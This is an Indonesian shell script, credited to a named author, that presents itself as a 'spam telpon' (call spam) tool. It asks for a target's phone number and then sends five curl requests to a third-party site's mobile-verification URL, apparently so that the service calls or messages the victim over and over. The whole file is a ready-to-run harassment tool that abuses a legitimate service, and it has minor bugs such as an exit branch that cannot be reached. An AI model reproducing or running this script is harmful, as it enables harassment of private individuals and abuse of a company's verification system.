#!bin/sh
clear
white="\033[97m";
black="\033[30m\033[1m";
yellow="\033[93m";
orange="\033[38;5;208m";
blue="\033[34m";
lblue="\033[36m";
green="\033[92m";
fgreen="\033[32m";
red="\033[91m";
magenta="\033[35m";
bluebg="\033[44m";
lbluebg="\033[106m";
greenbg="\033[42m";
lgreenbg="\033[102m";
yellowbg="\033[43m";
lyellowbg="\033[103m";
redbg="\033[101m";
grey="\033[37m";
cyan="\033[36m";
bold="\033[1m";
kosong="\033[0m";

ask="\033[97m[ \033[91m?\033[97m ] ";
err="\033[97m[ \033[93m!\033[97m ] ";
suk="\033[97m[ \033[92m+\033[97m ] ";

echo " $green•$yellow============================================$greem•	"
echo " $blue Author	   :$cyan Kafid_Renaldo          	"
echo " $blue github	   :$cyan github.com/kafidrenaldo	"
echo " $green•$yellow============================================$green•	"
echo "$err $red info					"
echo "$redbg $cyan $bold batas spam : 03"
echo "   tidak bisa pake 08/+62"
echo "   Example:885876xxxxx$kosong"
echo
toilet -f small -F gay 		Spam Telpon
echo 
echo "$green [ $lblue 01 $green ] $grey $bold spam-telp"
echo "$green [ $lblue 02 $green ] $grey $bold Exit tools"

echo
read -p "masukan pilihan anda : " pil
if [ $pil = 1 ] || [ $pil = 01 ]; then
read -p "masukan no target : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
echo "$suk Spam Telepon Akan Segera Dikirim Mohon Tunggu"
echo "$suk untuk menghetikan spam tekan "ctrl + c / ctrl + z" "
curl -s $link \n
curl -s $link \n
curl -s $link \n
curl -s $link \n
curl -s $link \n
if [ $pil = 2 ] || [ $pil = 02 ]; then
echo 'terima kasih udah pake tools gue'
exit
fi
else
    echo "$err $bold Input Salah..$red!!!"
    sh spam-telp.sh
    fi
